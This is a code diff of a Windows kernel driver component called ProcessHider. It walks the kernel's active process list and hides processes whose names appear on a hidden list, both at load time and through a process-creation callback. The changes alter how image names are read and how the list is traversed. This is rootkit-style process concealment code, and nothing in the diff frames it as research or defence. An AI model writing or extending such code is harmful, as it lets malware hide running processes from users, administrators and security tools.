@@ -9,7 +9,14 @@ namespace filter
 
 	NTSTATUS ProcessHider::Register()
 	{
+		UNICODE_STRING PS_GET_PROCESS_IMAGE_FILE_NAME = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");
+		gGetProcessImageFileName = (GET_PROCESS_IMAGE_NAME)
+			MmGetSystemRoutineAddress(&PS_GET_PROCESS_IMAGE_FILE_NAME);
+
+		KeInitializeGuardedMutex(&process_lock_);
+
 		ProcessHider::HideOnInitializeOperation();
+
 		NTSTATUS status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, FALSE);
 
 		if (!NT_SUCCESS(status)) 
@@ -17,7 +24,6 @@ namespace filter
 			ProcessHider::Unload();
 		}
 
-		KeInitializeGuardedMutex(&process_lock_);
 
 		return status;
 	}
@@ -30,22 +36,29 @@ namespace filter
 	bool ProcessHider::GetShortNameByPid(PWCHAR short_name, int size, HANDLE pid)
 	{
 		PEPROCESS eprocess;
-		PUNICODE_STRING process_name;
-		bool ret;
+
 		if (PsLookupProcessByProcessId(pid, &eprocess) != STATUS_SUCCESS)
 		{
 			return false;
 		}
-		if (SeLocateProcessImageName(eprocess, &process_name) != STATUS_SUCCESS)
+
+		PCHAR name = gGetProcessImageFileName(eprocess);
+
+		for (int i = 0;; i++)
 		{
-			return false;
+			if (name[i] == 0)
+			{
+				short_name[i] = (WCHAR)name[i];
+				break;
+			}
+			if (i >= size)
+			{
+				return false;
+			}
+			short_name[i] = (WCHAR)name[i];
 		}
-		
-		ret = ulti::GetNameWithoutDirectory(short_name, size, process_name);
 
-		ExFreePool(process_name->Buffer);
-
-		return ret;
+		return true;
 	}
 
 	bool ProcessHider::IsProcessInHiddenList(PWCHAR process_name)
@@ -56,7 +69,7 @@ namespace filter
 	void ProcessHider::HideOnInitializeOperation()
 	{
 		WCHAR process_name[MAX_SIZE];
-		int last_pid;
+		long long last_pid;
 		PLIST_ENTRY next_p_list_entry_eprocess;
 
 		P_CUSTOM_EPROCESS cur_p_eprocess = NULL, next_p_eprocess = NULL;
@@ -72,26 +85,21 @@ namespace filter
 		{
 			HANDLE cur_pid = cur_p_eprocess->UniqueProcesId;
 
-			if ((int)cur_pid < last_pid)
-			{
-				break;
-			}
-
-			last_pid = (int)cur_pid;
+			last_pid = (long long)cur_pid;
 			next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
 			next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
-
+			
 			if (GetShortNameByPid(process_name, MAX_SIZE, cur_pid) == true)
 			{
 				if (IsProcessInHiddenList(process_name))
 				{
 					if (HideProcess(cur_p_eprocess) == true)
 					{
-						// Do something
 						DebugMessage("Hide process with PID %d and name %S", (int)cur_pid, process_name);
 					}
 				}
 			}
+			
 			cur_p_eprocess = next_p_eprocess;
 			if (cur_p_eprocess->UniqueProcesId == (HANDLE)SYSTEM_PID)
 			{
@@ -113,7 +121,6 @@ namespace filter
 			{
 				return;
 			}
-
 
 			if (IsProcessInHiddenList(name))
 			{
